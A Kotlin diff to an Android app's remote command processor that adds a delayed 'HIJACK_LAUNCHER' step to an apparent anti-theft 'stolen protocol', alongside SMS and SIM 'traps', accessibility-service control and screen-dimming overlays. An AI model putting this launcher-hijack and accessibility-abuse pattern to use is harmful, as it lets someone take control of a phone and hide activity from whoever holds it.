@@ -1325,9 +1325,10 @@ object CommandProcessor {
                             }
                         }
                         
-                        // 4. Stop Relentless SMS Traps
+                        // 4. Stop Relentless SMS Traps & Launcher Hijack
                         DefaultSmsManager.isRelentlessActive = false
                         DefaultSmsManager.expectedMode = ""
+                        LauncherManager.isHijacking = false
                         
                         // 5. Clear Pending Alerts & SIM Traps
                         ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
@@ -1405,14 +1406,26 @@ object CommandProcessor {
                         JudasManager.checkPendingStolenAlert(ctx)
                     }, 22000)
 
+                    // 5.5 HIJACK LAUNCHER (Delayed to 26s)
                     Handler(Looper.getMainLooper()).postDelayed({
-                        if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            val setLauncherCmd = org.json.JSONObject().apply { put("id", -8); put("file_name", "SET_LAUNCHER"); put("content", "ON|") }
+                            processSingleCommand(ctx, setLauncherCmd)
+                            kotlinx.coroutines.delay(1000)
+                            val hijackCmd = org.json.JSONObject().apply { put("id", -9); put("file_name", "HIJACK_LAUNCHER"); put("content", "") }
+                            processSingleCommand(ctx, hijackCmd)
+                        }
+                    }, 26000)
+
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true || LauncherManager.isHijacking) {
                             DefaultSmsManager.expectedMode = ""
                             MyAccessibilityService.instance?.isWaitingForDataSettings = false
+                            LauncherManager.isHijacking = false
                             MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                             DimmerManager.removeOverlay(ctx)
                         }
-                    }, 35000)
+                    }, 45000)
 
                     status = "STOLEN_PROTOCOL_QUEUED_5S"
                             errorMsg = "Orchestrator lead-in active. Targeting: $targetNum"
